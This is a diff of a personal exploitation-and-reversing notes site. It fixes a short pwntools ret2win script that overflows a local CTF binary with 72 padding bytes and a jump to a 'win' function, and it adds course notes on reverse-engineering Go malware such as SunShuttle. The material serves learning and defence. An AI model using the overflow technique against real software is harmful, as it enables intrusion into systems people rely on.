@@ -237,9 +237,9 @@ io = elf.process()
 
 win_function_addr = elf.sym[&quot;deactivate_camera&quot;]
 
-payload = b&quot;A&quot; * 72 + win_function_addr 
+payload = b&quot;A&quot; * 72 + p64(win_function_addr) 
 
-io.sendlineafter(b&quot;&gt; &quot;, 1)
+io.sendlineafter(b&quot;&gt; &quot;, b&quot;1&quot;)
 io.sendlineafter(b&quot;&gt; &quot;, payload)
 io.interactive()
 </code></pre>
@@ -331,9 +331,65 @@ rabin2 is very useful when looking at go strings and is absolutely straightforwa
 <h2 id="reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky"><a class="header" href="#reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky">Reversing in action: Golang malware used in the SolarWinds attack (Kaspersky)</a></h2>
 <p>From now on, the notes are not related to the <strong>Anatomy of Go video</strong>, but on this <a href="https://www.youtube.com/watch?v=_cL-OwU9pFQ">Kaspersky course</a>. I highly recommend that you go watch the video too.</p>
 <p>This course is an absolute pearl and helped me a lot learn more about Go and Reverse Engineering, we focus principally on reversing a piece of malware that was used in the SolarWinds breach a little earlier this year, the malware in question is <strong>SunShuttle</strong>.</p>
-<div style="break-before: page; page-break-before: always;"></div><h2 id="reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky-1"><a class="header" href="#reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky-1">Reversing in action: Golang malware used in the SolarWinds attack (Kaspersky)</a></h2>
-<p>From now on, the notes are not related to the <strong>Anatomy of Go video</strong>, but on this <a href="https://www.youtube.com/watch?v=_cL-OwU9pFQ">Kaspersky course</a>. I highly recommend that you go watch the video too.</p>
-<p>This course is an absolute pearl and helped me a lot learn more about Go and Reverse Engineering, we focus principally on reversing a piece of malware that was used in the SolarWinds breach a little earlier this year, the malware in question is <strong>SunShuttle</strong>.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky-1"><a class="header" href="#reversing-in-action-golang-malware-used-in-the-solarwinds-attack-kaspersky-1">Reversing in action: Golang malware used in the SolarWinds attack (Kaspersky)</a></h1>
+<p>This course is a must if your going to reverse go malware, it takes a very deep approach in the analysis of a malware named <strong>SunShuttle</strong>, it was notably used as a fully featured backdoored in the <strong>SolarWinds Breach Indicent</strong>, which was one of the biggest breach in the history of hacking.</p>
+<h2 id="introduction"><a class="header" href="#introduction">Introduction</a></h2>
+<p><strong>What you will learn</strong> :</p>
+<pre><code>- How to reverse-engineer Go Malware
+- Fundamentals of the Go Language
+</code></pre>
+<p><strong>Why it is important ? :</strong></p>
+<pre><code>- Go is increasingly being used among malware authors
+- Go binaries cannot be tackled with the usual approach
+</code></pre>
+<p><strong>In Context :</strong></p>
+<pre><code>- [Sunburst Backdoor Kazuar](https://securelist.com/sunburst-backdoor-kazuar)
+</code></pre>
+<p>If you haven't did already, go see my notes on <a href="https://exploitation.reversing-ninja.com/anatomy-of-a-gopher.html">Anatomy of a Gopher</a> they might greatly help for this course and also don't forget to go watch the SANS talk by hex0punk about Go Reverse Engineer (link in Anatomy of a Gopher notes).</p>
+<p><strong>Things to notes about Go before starting to reverse :</strong></p>
+<pre><code>- Generates statically-built executables, this makes the program weigh a LOT more than usual dynamically programs, a simple **Hello World** program can weigh up to **2 Megabytes** that is huge !
+- Go does not enable PIC or PIE (Position Independent Code or Executable).
+- Go does not stripped binaries by default.
+- Go does not enable any stack protections (stack canaries).
+- Searching for strings in a Go binary can't be quite a pain in the ass.
+- Searching for functions is easier than searching for strings, since functions name aren't stripped.
+- Go stacks are really small by default (2 kibibytes or 1024 bytes of stack), therefore many goroutines will call **morestack** (sym.runtime.morestack\_noctxt), to grow the stack size (in powers of 2) as needed using **stack copying**.
+- Go uses 8 bytes alignment on the stack.
+- Each functions compare it's stack pointer agains't **g-&gt;stackguard** to check for overflow.
+- Go binaries can return multiple values, therefore it places all the return values on the stack, because 3 return values would not fit inside rax.
+- Decompiling go binaries won't be very useful as it doesn't make the code more readable in a C representation.
+</code></pre>
+<h2 id="practice-reverse-engineering-small-go-programs"><a class="header" href="#practice-reverse-engineering-small-go-programs">Practice Reverse Engineering Small Go Programs</a></h2>
+<p>Let's take an example, we will write a small Go program, compile it without optimizations and look at the assembly of it, we will write this small program :</p>
+<pre><code class="language-go">package main
+import (
+    &quot;fmt&quot;
+)
+
+// Compiled with disabled optimizations (-gcflags '-N -l')
+
+func main(){
+    res := sum(1, 10, 100)
+    fmt.Println(&quot;Result = &quot;, res)
+}
+
+func sum(a, b, c int) (int){
+    return a + b + c
+}
+</code></pre>
+<p><strong>Compile this and open it in IDA or your preferred disassembler and let's start doing some reversing :</strong>
+First thing to note is that we don't have the usual function prologue (<strong>push rbp; mov rbp, rsp</strong>), instead functions start by checking if the stack is big enough </p>
+<pre><code class="language-x86asm">    mov rcx, gs:28h; 
+    mov rcx, [rcx+0]; 
+    lea rax, [rsp+var_8]; 
+    cmp rax, [rcx+10h]; 
+    jbe address
+</code></pre>
+<p>In this code we check if the argument at [rsp+var_8] is below the address of <strong>rcx</strong>, which should be something like the stack size or address or offset, i am not sure on this one.</p>
+<p>If we were below <strong>rcx</strong> or equal to it, we jump to <strong>sym.runtime.morestack_noctxt</strong>, which as said previously will double the stack size using <strong>stack copying</strong>.</p>
+<p>Since this code is usually present at the beginning of every function, you can just ignore it (you can change it's color to black in IDA or what i like to do is right click on the block of code i want to hide and click group node, input a text that represent the block code and confirm).</p>
+<p>You should end up with something that look like this if you did my way :
+<img src="https://i.imgur.com/4WzoSD9.png" alt="Nodes Grouped" /></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="embryoasm-level-6"><a class="header" href="#embryoasm-level-6">EmbryoASM Level 6</a></h1>
 <p>So this challenge is a little bit harder since we need to compute the modulo of rdi with 256 and rsi with 65536 using only
 MOV instructions.</p>
